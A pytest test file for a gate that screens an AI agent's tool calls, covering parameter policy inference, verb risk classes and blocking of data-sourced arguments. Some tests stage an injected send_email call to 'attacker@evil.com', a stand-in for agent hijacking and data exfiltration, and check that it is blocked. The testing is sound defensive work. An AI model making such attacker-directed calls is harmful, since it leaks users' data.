"""Tests for the verb-authority gate. Run with: pytest test_gate.py -v"""
import pytest
from verb_authority import (
    Policy, Confidence, Risk, Param, Tool, Registry,
    infer_policy, verb_risk, build_policy, gate, dispatch,
)

# --- inference --------------------------------------------------------------

def test_email_type_infers_trusted_fixed():
    pol, conf = infer_policy(Param("to", "email"))
    assert pol is Policy.TRUSTED_FIXED and conf is Confidence.HIGH

def test_uri_type_infers_trusted_fixed():
    assert infer_policy(Param("endpoint", "uri"))[0] is Policy.TRUSTED_FIXED

def test_number_type_infers_typed_bounded():
    pol, conf = infer_policy(Param("amount", "number"))
    assert pol is Policy.TYPED_BOUNDED and conf is Confidence.HIGH

def test_strong_sink_name_infers_trusted_fixed():
    assert infer_policy(Param("recipient_account", "string"))[0] is Policy.TRUSTED_FIXED

def test_payload_name_infers_outbound_payload():
    assert infer_policy(Param("body", "string"))[0] is Policy.OUTBOUND_PAYLOAD

def test_ambiguous_string_marked_uncertain_and_locked_safe():
    pol, conf = infer_policy(Param("destination", "string"))
    assert conf is Confidence.UNCERTAIN
    assert pol is Policy.TRUSTED_FIXED   # safe-by-default

# --- verb-risk --------------------------------------------------------------

def test_destructive_verb_caught():
    assert verb_risk("delete_record") is Risk.DESTRUCTIVE

def test_code_exec_verb_caught():
    assert verb_risk("execute_sql") is Risk.CODE_EXEC

def test_financial_verb_caught():
    assert verb_risk("make_payment") is Risk.FINANCIAL

def test_read_only_verb_caught():
    assert verb_risk("search_web") is Risk.READ_ONLY

def test_unknown_verb_defaults_to_write():
    assert verb_risk("foo_bar") is Risk.WRITE

# --- gate -------------------------------------------------------------------

def _setup():
    reg = Registry()
    reg.add(Tool("send_email", [Param("to","email"), Param("subject","string"), Param("body","string")]))
    reg.add(Tool("delete_record", [Param("table","string"), Param("record_id","string")]))
    ps = build_policy(reg)
    ps.policy["send_email"]["subject"] = Policy.TYPED_BOUNDED   # dev resolved post-review
    return reg, ps

def test_gate_blocks_data_authoring_a_sink():
    reg, ps = _setup()
    d = gate(reg, ps, "send_email",
             {"to":"attacker@evil.com","body":"x"}, {"to":"data","body":"data"})
    assert not d.allow and "locked sink" in d.reason

def test_gate_allows_trusted_provenance_on_sink():
    reg, ps = _setup()
    d = gate(reg, ps, "send_email",
             {"to":"alice@company.com","body":"ok"}, {"to":"trusted","body":"data"})
    assert d.allow

def test_gate_allows_outbound_payload_from_data():
    reg, ps = _setup()
    d = gate(reg, ps, "send_email",
             {"to":"alice@company.com","body":"text lifted from a doc"},
             {"to":"trusted","body":"data"})
    assert d.allow

def test_gate_rejects_unknown_tool():
    reg, ps = _setup()
    assert not gate(reg, ps, "send_sms", {}, {}).allow

def test_gate_rejects_unknown_param():
    reg, ps = _setup()
    d = gate(reg, ps, "send_email",
             {"to":"alice@company.com","foo":"bar"}, {"to":"trusted","foo":"trusted"})
    assert not d.allow

def test_destructive_verb_flags_needs_confirm():
    reg, ps = _setup()
    d = gate(reg, ps, "delete_record",
             {"table":"users","record_id":"42"}, {"table":"trusted","record_id":"trusted"})
    assert d.allow and d.needs_confirm

def test_write_verb_does_not_require_confirm():
    reg, ps = _setup()
    d = gate(reg, ps, "send_email",
             {"to":"alice@company.com","body":"ok"}, {"to":"trusted","body":"data"})
    assert d.allow and not d.needs_confirm

# --- dispatch (drop-in) -----------------------------------------------------

def test_dispatch_blocks_attack_via_tool_use_block():
    reg, ps = _setup()
    tool_use = {"name":"send_email", "input":{"to":"attacker@evil.com","body":"x"}}
    d = dispatch(reg, ps, tool_use, trusted_args={"to":"alice@company.com"})
    assert not d.allow

def test_dispatch_allows_when_arg_matches_trusted():
    reg, ps = _setup()
    tool_use = {"name":"send_email", "input":{"to":"alice@company.com","body":"x"}}
    d = dispatch(reg, ps, tool_use, trusted_args={"to":"alice@company.com"})
    assert d.allow
